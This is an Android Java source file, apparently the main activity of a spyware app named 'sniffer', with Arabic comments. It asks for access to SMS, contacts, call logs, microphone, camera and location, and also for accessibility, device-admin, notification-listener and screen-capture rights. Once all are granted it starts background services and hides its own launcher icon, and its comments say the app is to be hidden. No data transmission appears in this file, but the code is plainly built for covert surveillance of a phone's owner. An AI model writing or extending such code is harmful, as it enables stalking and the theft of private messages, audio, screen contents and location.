package com.v8.global.sniffer;

import android.Manifest;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.accessibility.AccessibilityManager;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_MEDIA_PROJECTION = 100;
    private static final int REQUEST_CODE_PERMISSIONS = 101;
    
    private String[] permissions = {
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // التحقق إذا كانت كل الصلاحيات ممنوحة
        if (checkAllPermissions()) {
            // إذا كل الصلاحيات ممنوحة، أخفي التطبيق فوراً
            hideAppAndStartServices();
        } else {
            // طلب الصلاحيات
            requestAllPermissions();
        }
    }

    private boolean checkAllPermissions() {
        // التحقق من صلاحية الإشعارات
        String enabledListeners = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        boolean notificationEnabled = enabledListeners != null && enabledListeners.contains(getPackageName());
        
        // التحقق من صلاحية الوصول
        AccessibilityManager am = (AccessibilityManager) getSystemService(ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
        boolean accessibilityEnabled = false;
        for (AccessibilityServiceInfo service : enabledServices) {
            if (service.getId().contains(getPackageName())) {
                accessibilityEnabled = true;
                break;
            }
        }
        
        // التحقق من صلاحية Admin
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName adminReceiver = new ComponentName(this, AdminReceiver.class);
        boolean adminEnabled = dpm.isAdminActive(adminReceiver);
        
        // التحقق من صلاحية تسجيل الشاشة
        SharedPreferences prefs = getSharedPreferences("screen_capture", MODE_PRIVATE);
        boolean screenCaptureEnabled = prefs.contains("resultCode");
        
        // التحقق من الأذونات العادية
        boolean normalPermissions = true;
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                normalPermissions = false;
                break;
            }
        }
        
        return notificationEnabled && accessibilityEnabled && adminEnabled && screenCaptureEnabled && normalPermissions;
    }

    private void requestAllPermissions() {
        // 1. طلب صلاحية الإشعارات
        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        
        // 2. طلب صلاحية الوصول
        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        
        // 3. طلب صلاحية Admin
        ComponentName adminReceiver = new ComponentName(this, AdminReceiver.class);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        if (!dpm.isAdminActive(adminReceiver)) {
            Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminReceiver);
            startActivity(adminIntent);
        }
        
        // 4. طلب صلاحية تسجيل الشاشة
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            MediaProjectionManager projectionManager = 
                (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            startActivityForResult(
                projectionManager.createScreenCaptureIntent(),
                REQUEST_MEDIA_PROJECTION
            );
        }
        
        // 5. طلب تجاهل البطارية
        Intent batteryIntent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
        batteryIntent.setData(Uri.parse("package:" + getPackageName()));
        startActivity(batteryIntent);
        
        // 6. طلب الأذونات العادية
        List<String> permissionsNeeded = new ArrayList<>();
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }
        
        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                permissionsNeeded.toArray(new String[0]), 
                REQUEST_CODE_PERMISSIONS);
        }
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == Activity.RESULT_OK) {
            getSharedPreferences("screen_capture", MODE_PRIVATE)
                .edit()
                .putInt("resultCode", resultCode)
                .putString("data", data.toUri(0))
                .apply();
        }
        
        // بعد كل نتيجة، تحقق إذا كل الصلاحيات ممنوحة
        if (checkAllPermissions()) {
            hideAppAndStartServices();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        // بعد كل نتيجة، تحقق إذا كل الصلاحيات ممنوحة
        if (checkAllPermissions()) {
            hideAppAndStartServices();
        }
    }

    private void hideAppAndStartServices() {
        // بدء الخدمات
        startService(new Intent(this, MainService.class));
        startService(new Intent(this, AccessibilityControlService.class));
        
        // إخفاء التطبيق بعد ثانية
        new android.os.Handler().postDelayed(() -> {
            PackageManager pm = getPackageManager();
            pm.setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        }, 1000);
    }

    @Override
    protected void onResume() {
        super.onResume();
        // إذا كل الصلاحيات ممنوحة، أخفي التطبيق
        if (checkAllPermissions()) {
            hideAppAndStartServices();
        }
    }
}
